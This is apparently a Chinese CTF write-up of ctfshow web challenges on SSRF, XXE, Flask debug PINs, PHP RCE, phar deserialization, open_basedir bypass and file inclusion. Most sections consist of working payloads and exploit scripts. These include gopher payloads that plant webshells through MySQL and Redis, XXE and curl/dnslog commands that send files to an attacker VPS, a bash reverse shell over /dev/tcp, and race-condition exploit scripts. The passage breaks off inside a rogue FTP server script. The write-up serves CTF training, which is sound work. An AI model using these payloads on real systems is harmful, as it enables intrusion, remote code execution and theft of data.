33%65%25%32%37%25%32%30%25%36%39%25%36%65%25%37%34%25%36%66%25%32%30%25%36%66%25%37%35%25%37%34%25%36%36%25%36%39%25%36%63%25%36%35%25%32%30%25%32%37%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30%25%32%37%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31


如果使用其他的来编码，只会把特殊字符%进行编码，那就打不出来了，像这样的：可以看到他只是在第一次的基础上把%编码成了%25
2.这时只能选择用burpsuite来发包，用hackbar发包就不行了
gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2530%255d%2529%253b%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2527%2501%2500%2500%2500%2501
```

执行成功后即可getshell

![image-20220113132935491](assets/image-20220113132935491.png)

## web360

用 SSRF 打 redis，工具同上![image-20220113134100273](assets/image-20220113134100273.png)

`payload：url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252425%250D%250A%250A%250A%253C%253F%253Deval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A`

![image-20231117111216239](assets/image-20231117111216239.png)

# 0x0C XXE

## web373

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    //DOMDocument,表示整个HTML或XML文档;作为文档树的根。
    $dom = new DOMDocument();
    //loadXML,从一个字符串中，加载一个XML文档
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    //将XML文档作为一个导入一个XML对象
    $creds = simplexml_import_dom($dom);
    //XML对象指向ctfshow的元素标签
    $ctfshow = $creds->ctfshow;
    echo $ctfshow;
}
highlight_file(__FILE__);    
```

这里我们就可以POST传一个读取服务器的xml，被php://input解析并加载后，通过echo我们就可以看到flag了：

```xml
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<sun>
<ctfshow>&xxe;</ctfshow>
</sun>



<?xml version="1.0" encoding="UTF-8"?>
<!-- 定义hacker变量 -->
<!-- 外部实体的声明使用SYSTEM关键字，并且必须指定应从中加载实体值的URL。注入实体，值为根目录下flag文件内容 -->
<!DOCTYPE hacker[
    <!ENTITY hacker SYSTEM "file:///flag">
]> 
<!-- -->
<root>
<!-- PHP中$ctfshow = $creds->ctfshow; -->
    <ctfshow>
<!-- 读取hacker变量 -->
        &hacker;
    </ctfshow>
</root>
```

![img](assets/1-38-1024x384.png)

## web374

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);   
```

这里load完就不echo了，也就是没回显了，我们可以考虑外带到自己的vps上：

**xml.php**

```php
<?php
$content = $_GET['1'];
if(isset($content)){
    file_put_contents('flag.txt','Last update time:'.date("Y-m-d H:i:s")."\n".base64_decode($content));
}else{
    echo 'no data input';
}
```

**xxe.xml**

```xml-dtd
<!ENTITY % all
"<!ENTITY &#x25; send SYSTEM 'http:/vps/xml.php?1=%file;'"
>
%all;
```

把这两个文件放在自己vps的网站目录里，payload：

```xml-dtd
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % remote SYSTEM "http://vps/xxe.xml">
%remote;
%send;
]>
```

原理就是用xml多次外带最后接受flag数据，后面在自己服务器上的flag.txt就是flag的内容了



## web375

```
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"/', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
```

过滤了版本号，但我们本来就没用这个，payload还是：

```
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % remote SYSTEM "http://vps/xxe.xml">
%remote;
%send;
]>
```

## web376

```
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
```

同上

## web377

```
<?php

error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"|http/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
```

多过滤了 http 头，利用 utf-16 编码

```
import requests
url = 'http://5d09502d-95cc-48df-a33f-0c87a79d628e.challenge.ctf.show/'
payload = '''
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % remote SYSTEM "http://vps/xxe.xml">
%remote;
%send;
]>
'''
payload = payload.encode('utf-16')
rep = requests.post(url=url, data=payload)
print(rep.text)
```

## web378

![img](assets/1-39.png)

抓包可以发现登录传值是以xml形式传的，所以替换成我们的xml payload即可

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY file SYSTEM "file:///flag">
]>
<user>
<username>&file;</username>
<password>123</password>
</user>
```

![img](assets/1-40-1024x367.png)

# 0x0D 常用姿势

## web801 (python计算PIN码)

非预期解：直接读flag文件：/file?filename=/flag

预期解：计算PIN码，进入python控制台，利用os等模块执行命令，读取flag

这个题的姿势就是算pin码

pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的webshell。

六要素：

- username 通过getpass.getuser()读取，通过文件读取/etc/passwd，一般是root
- modname 通过getattr(mod,“file”,None)读取，默认值为flask.app
- appname 通过getattr(app,“name”,type(app).name)读取，默认值为Flask
- moddir 当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取
- uuidnode 通过uuid.getnode()读取，通过文件/sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算
- machine_id  每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_id，docker靶机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id，在docker环境下读取后两个，非docker环境三个都需要读取

旧版的算法(3.6)：

```php
#MD5
import hashlib
from itertools import chain
probably_public_bits = [
     'flaskweb'# username
     'flask.app',# modname
     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
     '25214234362297',# str(uuid.getnode()),  /sys/class/net/ens33/address
     '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
   h.update(b'pinsalt')
   num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
   for group_size in 5, 4, 3:
       if len(num) % group_size == 0:
          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                      for x in range(0, len(num), group_size))
          break
       else:
          rv = num

print(rv)
```

新版的算法：(3.8)

```php
#sha1
import hashlib
from itertools import chain
probably_public_bits = [
    'root'# /etc/passwd
    'flask.app',# 默认值
    'Flask',# 默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到
]

private_bits = [
    '2485377581187',#  /sys/class/net/eth0/address 16进制转10进制
    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup
    '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

报错得到路径：/usr/local/lib/python3.8/site-packages/flask/app.py，并且知道了这是3.8，要用3.8的脚本

![img](assets/1-77.png)

然后按照顺序一个一个拿数据。

读/etc/passwd拿到用户名root

![img](assets/1-79-1024x349.png)

modname默认值为flask.app，appname默认值为Flask

读/sys/class/net/eth0/address得到uuidnode：02:42:ac:0c:0b:42，把它看成0x0242ac0c0b42转化十进制得到2485377567554

![img](assets/1-78-1024x222.png)

然后读取/proc/sys/kernel/random/boot_id和/proc/self/cgroup拼接起来得到machine_id：(两个值，一前一后放一起就行，不要用-符号链接)

```
d1b2665b-a5c7-4542-af02-960390811e5ba245d3eb571602d0e8005d5cc2c7d3cd04e09ae4154e7bad0c9ba40f88abd4f8
```

带入3.8的脚本计算pin码

![img](assets/1-80.png)

得到134-919-743，访问/console，输入pin码，即可执行代码，

```
import os
os.popen('cat /*f*').read()
```

![image-20231120102035572](assets/image-20231120102035572.png)

## web802（无字母数字RCE-（POST传参、上传临时文件））

最基础的无字母数字getshell

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$cmd = $_POST['cmd'];

if(!preg_match('/[a-z]|[0-9]/i',$cmd)){
    eval($cmd);
}

//POST传参数的payload,注意拿到burp发包，不要编码，不要用hackbar
cmd=$_=(_/_._)[_];$_%2b%2b;$%FA=$_.$_%2b%2b;$_%2b%2b;$_%2b%2b;$_=_.$%FA.%2b%2b$_.%2b%2b$_;$$_[_]($$_[%FA]);&_=system&%FA=tac f*
    
cmd=$_=(_/_._)[_];$_++;$ú=$_.$_++;$_++;$_++;$_=_.$ú.++$_.++$_;$$_[_]($$_[ú]);&_=system&ú=tac f*
```

![img](assets/1-12-1024x528.png)

解法二：修改羽师傅脚本，利用上传临时文件，getshell

```python
原脚本：
#coding:utf-8
#author yu22x
import requests
url="http://xxx/test.php?code=?><?=`. /???/????????[@-[]`;?>"
files={'file':'cat f*'}#命令在这里改就行了，一次执行不成功，多试几次，有概率问题
response=requests.post(url,files=files)
html = response.text
print(html)

#改个POST的：
#coding:utf-8
import requests
url="http://b23b5651-5117-4813-8704-59e6e86d1b87.challenge.ctf.show/"
files={'file':'cat f*'}#命令在这里改就行了，一次执行不成功，多试几次，有概率问题
datas={"cmd":"?><?=`. /???/????????[@-[]`;?>"}
response=requests.post(url,files=files,data = datas)
html = response.text
print(html)
之后直接打
```

![image-20231120105448023](assets/image-20231120105448023.png)

## web803（phar文件包含/上传执行代码（压缩后还是可以用phar协议执行php代码））

phar文件包含，即使是压缩后还是可以用phar协议执行php代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file.'.txt')){
        include $file.'.txt';
    }else{
        file_put_contents($file,$content);
    }
}
```

phar文件包含，即使是压缩后还是可以用phar协议执行php代码

```php
<?php 
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "<?php eval(\$_POST[1]);?>");
$phar->stopBuffering();
?>   
```

```python
import requests  
url="http://76aa7571-0a18-46f1-99fc-3b8fcbb4d36f.challenge.ctf.show/index.php"
data1={'file':'/tmp/a.phar','content':open('shell.phar','rb').read()}
data2={'file':'phar:///tmp/a.phar/a','content':'123','1':'system("cat f*");'}
requests.post(url,data=data1)
r=requests.post(url,data=data2)
print(r.text)
```



## web804（phar反序列化）

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}

$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file)){
        unlink($file);
    }else{
        file_put_contents($file,$content);
    }
}
```

一眼Phar反序列化

```php
<?php 

class hacker{
    public $code="system('cat f*');";
    public function __destruct(){
        eval($this->code);
    }
}
$t=new hacker();

$phar = new Phar('poc.phar');
$phar->stopBuffering();
$phar->setStub('GIF89a' . '<?php __HALT_COMPILER();?>');
$phar->addFromString('test.txt', 'test');
$phar->setMetadata($t);
$phar->stopBuffering();
```

```python
import requests  
url="http://47d5b4bf-9dc6-4aa8-93f1-6d42cf431490.challenge.ctf.show/index.php"
data1={'file':'/tmp/a.phar','content':open('poc.phar','rb').read()}
data2={'file':'phar:///tmp/a.phar','content':'123'}
requests.post(url,data=data1)
r=requests.post(url,data=data2)
print(r.text)
```



## web805（绕过open_basedir）

```
<?php
error_reporting(0);
highlight_file(__FILE__);

eval($_POST[1]);
```

open_basedir绕过，[浅谈几种Bypass open_basedir的方法](https://www.cnblogs.com/hookjoy/p/12846164.html)

解法一：

```php
1=mkdir(1);chdir(1);ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));

1=mkdir(1);chdir(1);ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');readfile('/ctfshowflag');
```

解法二：DirectoryIterator+glob://
 DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。
 DirectoryIterator与glob://结合将无视open_basedir，列举出根目录下的文件

```php
<?php
$c = "glob:///*"
$a = new DirectoryIterator($c);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```

![image-20231120131410885](assets/image-20231120131410885.png)

解法三：opendir()+readdir()+glob://
 opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目

```php
<?php
$a = $_GET['c'];
if ( $b = opendir($a) ) {
    while ( ($file = readdir($b)) !== false ) {
        echo $file."<br>";
    }
    closedir($b);
}
?>
只能Bypass open_basedir来列举根目录中的文件，不能列举出其他非根目录和open_basedir指定的目录中的文件。
```

解法四：P牛脚本结合文件包含

```php
<?php
/*
* by phithon
* From https://www.leavesongs.com
* detail: http://cxsecurity.com/issue/WLB-2009110068
*/
header('content-type: text/plain');
error_reporting(-1);
ini_set('display_errors', TRUE);
printf("open_basedir: %s\nphp_version: %s\n", ini_get('open_basedir'), phpversion());
printf("disable_functions: %s\n", ini_get('disable_functions'));
$file = str_replace('\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');
$relat_file = getRelativePath(__FILE__, $file);
$paths = explode('/', $file);
$name = mt_rand() % 999;
$exp = getRandStr();
mkdir($name);
chdir($name);
for($i = 1 ; $i < count($paths) - 1 ; $i++){
    mkdir($paths[$i]);
    chdir($paths[$i]);
}
mkdir($paths[$i]);
for ($i -= 1; $i > 0; $i--) { 
    chdir('..');
}
$paths = explode('/', $relat_file);
$j = 0;
for ($i = 0; $paths[$i] == '..'; $i++) { 
    mkdir($name);
    chdir($name);
    $j++;
}
for ($i = 0; $i <= $j; $i++) { 
    chdir('..');
}
$tmp = array_fill(0, $j + 1, $name);
symlink(implode('/', $tmp), 'tmplink');
$tmp = array_fill(0, $j, '..');
symlink('tmplink/' . implode('/', $tmp) . $file, $exp);
unlink('tmplink');
mkdir('tmplink');
delfile($name);
$exp = dirname($_SERVER['SCRIPT_NAME']) . "/{$exp}";
$exp = "http://{$_SERVER['SERVER_NAME']}{$exp}";
echo "\n-----------------content---------------\n\n";
echo file_get_contents($exp);
delfile('tmplink');

function getRelativePath($from, $to) {
  // some compatibility fixes for Windows paths
  $from = rtrim($from, '\/') . '/';
  $from = str_replace('\\', '/', $from);
  $to   = str_replace('\\', '/', $to);

  $from   = explode('/', $from);
  $to     = explode('/', $to);
  $relPath  = $to;

  foreach($from as $depth => $dir) {
    // find first non-matching dir
    if($dir === $to[$depth]) {
      // ignore this directory
      array_shift($relPath);
    } else {
      // get number of remaining dirs to $from
      $remaining = count($from) - $depth;
      if($remaining > 1) {
        // add traversals up to first matching dir
        $padLength = (count($relPath) + $remaining - 1) * -1;
        $relPath = array_pad($relPath, $padLength, '..');
        break;
      } else {
        $relPath[0] = './' . $relPath[0];
      }
    }
  }
  return implode('/', $relPath);
}

function delfile($deldir){
    if (@is_file($deldir)) {
        @chmod($deldir,0777);
        return @unlink($deldir);
    }else if(@is_dir($deldir)){
        if(($mydir = @opendir($deldir)) == NULL) return false;
        while(false !== ($file = @readdir($mydir)))
        {
            $name = File_Str($deldir.'/'.$file);
            if(($file!='.') && ($file!='..')){delfile($name);}
        } 
        @closedir($mydir);
        @chmod($deldir,0777);
        return @rmdir($deldir) ? true : false;
    }
}

function File_Str($string)
{
    return str_replace('//','/',str_replace('\\','/',$string));
}

function getRandStr($length = 6) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $randStr = '';
    for ($i = 0; $i < $length; $i++) {
        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
    }
    return $randStr;
}
```

![image-20231120131645711](assets/image-20231120131645711.png)

## web806（无参数RCE）

```php
?code=eval(end(current(get_defined_vars())));&flag=system('cat /c*');

?code=eval(current(getallheaders()));
X-Forwarded-For:system('cat /c*');//
```

## web807（无回显RCE）

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url = $_GET['url'];

$schema = substr($url,0,8);

if($schema==="https://"){
    shell_exec("curl $url");
}
```

### 法一：vps接收外带（可用）

```php
?url=https://;curl http://url:port?a=`cat /*`
```

![image-20231120132648487](assets/image-20231120132648487.png)

### 法二：将flag读取并写入文件，再进行读取（需要写入权限）

```php
1.使用>或>>
cat /fl* > flag.txt
cat flag.php >> flag.txt
2.使用cp 命令
cp flag.php flag.txt
3.使用mv命令
mv flag.php flag.txt
4.通过执行tar命令和zip命令打包或压缩php文件，在浏览器上下载打包或压缩文件解压得到php文件内容
（1）tar打包或tar打包并压缩
tar cvf flag.tar flag.php
tar zcvf flag.tar.gz flag.php
#解打包并解压缩：tar zxvf flag.tar.gz
```

![image-20231120133328020](assets/image-20231120133328020.png)

### 法三：写webshell(直接写入或外部下载直接写入或外部下载webshell)（可用）

```php
1.写webshell
echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps > webshell.php
echo "<?php @eval(\$_POST[123]); ?>" > webshell.php
2.外部下载shell
利用条件：目标服务器可以连接外网或可以与攻击机互通，且能执行wget命令
wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名
```

### 法四：在vps上建立记录脚本

**利用条件**：需要目标服务器可以向公网服务器发起http请求，并且能执行curl命令或wget命令

```php
1.构造记录脚本构造记录脚本
在自己的公网服务器站点根目录写入php文件，内容如下：
record.php
<?php
$data =$_GET['data'];
$f = fopen("flag.txt", "w");
fwrite($f,$data);
fclose($f);
?>
    
2.构造请求构造请求
在目标服务器的测试点可以发送下面其中任意一条请求进行测试
    curl http://*.*.*.*/record.php?data=`cat flag.php`
    wget http://*.*.*.*/record.php?data=`cat flag.php`
执行命令后发现在公网服务器得到的 flag.txt 文件中，只得到空内容，并未得到flag，猜测可能是未编码造成解析，于是修改payload
curl http://*.*.*.*/record.php?data=`cat flag.php|base64`
wget http://*.*.*.*/record.php?data=`cat flag.php|base64`
```

![image-20231120133917627](assets/image-20231120133917627.png)

### 法五：dnslog外带

（1）命令执行时要避免空格，空格会导致空格后面的命令执行不到；
（2）将读取的文件命令用反引号``包含起来

（3）拼接的域名有长度限制。

```php
利用命令：
curl `命令`.域名

//用<替换读取文件中的空格，且对输出结果base64编码
curl `cat<flag.php|base64`
    
#拼接域名(最终构造结果)
curl `cat<flag.php|base64`.v4utm7.ceye.io
#另一种方法(不过有的环境下不可以)
    `cat flag.php|sed s/[[:space:]]//g`.v4utm7.ceye.io
```

### 法六：反弹shell(可用)

```
curl http://ip:port|sh
```

利用条件：目标服务器可以向可通信的公网服务器发起http请求

```php
1.服务器端执行
nc -vv -lp 8888
2.命令执行处执行
curl http://ip:port|bash   //sh
    
#1.
首先在公网服务器使用nc命令监听端口
nc -lvp 4444 
#或nc -vv -lp 4444
#2.然后在公网服务器上写一个文件(我写入到qwzf文件)，内容是下面命令
bash -i >& /dev/tcp/x.x.x.165/4444 0>&1
#3.最终浏览器上执行的payload(实际上就是在目标机执行curl x.x.x.165:8002/qwzf|bash)
ip=|curl x.x.x.165:8002/qwzf|bash
```

![image-20231120140626960](assets/image-20231120140626960.png)



### 法七：curl上传文件读取源码(利用burp的Collaborator)

利用条件：目标服务器curl命令可以正常执行
使用 curl -F 将flag文件上传到Burp的Collaborator Client(Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看POST请求包以及打Cookies)

```php
1.获取获取 Collaborator Client 分配给分配给 Burp的链接的链接,拼接payload并在命令执行处提交并在命令执行处提交
ip=|curl -X POST -F xx=@flag.php http://jyla6p5cfepdojez34stnodch3ntbi.burpcollaborator.net
```

![image-20231120140128189](assets/image-20231120140128189.png)

## web808（条件竞争文件包含）

```php
<?php
error_reporting(0);
$file = $_GET['file'];


if(isset($file) && !preg_match("/input|data|phar|log/i",$file)){
    include $file;
}else{
    show_source(__FILE__);
    print_r(scandir("/tmp"));
}
```

### 法一：session.upload_progress条件竞争包含getshell

预期解肯定是**session.upload_progress**，但ctfshow只有半夜有环境

```python
import requests
import threading
import sys
session=requests.session()
sess='yu22x'
url1="http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/"
url2='http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/?file=/tmp/sess_yu22x'
data1={
    'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'
}
data2={
    '1':'echo 11123;system("cat /*");',
}
file={
    'file':'1'
}
cookies={
    'PHPSESSID': sess
}
def write():
    while True:
        r = session.post(url1,data=data1,files=file,cookies=cookies)
def read():
    while True:
        r = session.post(url2,data=data2)
        if '11123' in r.text:
            print(r.text)

if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in range(1,30): 
            threading.Thread(target=write).start()
        for i in range(1,30):
            threading.Thread(target=read).start()
    event.set()
```

### 法二：**利用Segfault遗留下临时文件文件进行getshell(卡临时文件包含)**

 其实就是让程序崩溃的同时上传文件，那么文件就会留在/tmp目录下。但是这种方法要知道文件名，要不然爆破起来也是挺麻烦的。但这里是刚好scandir(“/tmp”)了的，所以直接有文件名了
 **如果过滤了filter伪协议也可以包含自身来崩溃。**

#### 利用条件

php版本 7.0，有完整的包含点，并且参数可控，/tmp目录可写
 还需要得到上传的文件名

#### 原理

php在上传文件时候会先保存在临时目录，在php脚本运行完后自动删除

![image-20231120141500187](assets/image-20231120141500187.png)

#### 解题

先创建一个上传表单

```html
<html>
    <body>

        <form action="http://2af23aac-f3d7-45fa-a482-e46c74ea93ad.challenge.ctf.show/" method="post" enctype="multipart/form-data">
            <label for="file">Filename:</label>
            <input type="file" name="file" id="file" />
            <br />
            <input type="submit" name="submit" value="Submit" />
        </form>
    </body>
</html>

```

记得修改域名
 之后对其抓包并发送payload

```php
php://filter/string.strip_tags/resource=/etc/passwd
```

![image-20231120141622368](assets/image-20231120141622368.png)

之后返回原题刷新后会发现临时文件已经保存

![image-20231120141640796](assets/image-20231120141640796.png)

##### 利用脚本：

```php
#author:yu22x
import requests 
import re 
url = "http://e34a803b-ce00-4e1e-b585-9bda0198fe37.challenge.ctf.show/"
file={
	'file':'<?php system("cat /*");?>'
}
requests.post(url+'?file=php://filter/string.strip_tags/resource=/etc/passwd',files=file)
r=requests.get(url)
#print(r.text)
tmp=re.findall('=> (php.*?)\\n',r.text,re.S)[-1]
r=requests.get(url+'?file=/tmp/'+tmp)
print(r.text)
```

## web809（pearcmd.php文件包含/RCE）

```php
<?php
error_reporting(0);
$file = $_GET['file'];


if(isset($file) && !preg_match("/input|data|phar|log|filter/i",$file)){
    include $file;
}else{
    show_source(__FILE__);
    if(isset($_GET['info'])){
        phpinfo();
    }
}
```

喜欢我pearcmd吗

**记得别用hackbar，会帮你自动编码的，用burpsuite**

```
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=eval($_POST[1]);?>+/tmp/a.txt

?file=/tmp/a.txt
```

![image-20231120143229532](assets/image-20231120143229532.png)

## web810(SSRF打fastcgi)

**python gopherus.py --exploit fastcgi**

![image-20231120143529498](assets/image-20231120143529498.png)

得到payload,然后对_后面的payload进行一次url编码

```php
?url=gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH65%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00A%04%00%3C%3Fphp%20system%28%27tac%20/flagfile%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00

//url编码一次：
?url=gopher://127.0.0.1:9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%25F6%2506%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH65%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2509SCRIPT_FILENAMEindex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500A%2504%2500%253C%253Fphp%2520system%2528%2527tac%2520%2Fflagfile%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```

## web811(**file_put_contents打PHP-FPM**)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);


$file = $_GET['file'];
$content = $_GET['content'];

file_put_contents($file, $content);
```

https://www.anquanke.com/post/id/254387

上面文章是反弹shell了，但是我没有成功（泪奔）
 于是我利用curl进行命令执行
 首先利用vps搭建恶意的ftp服务器

```php
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0',80)) #端口可改
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
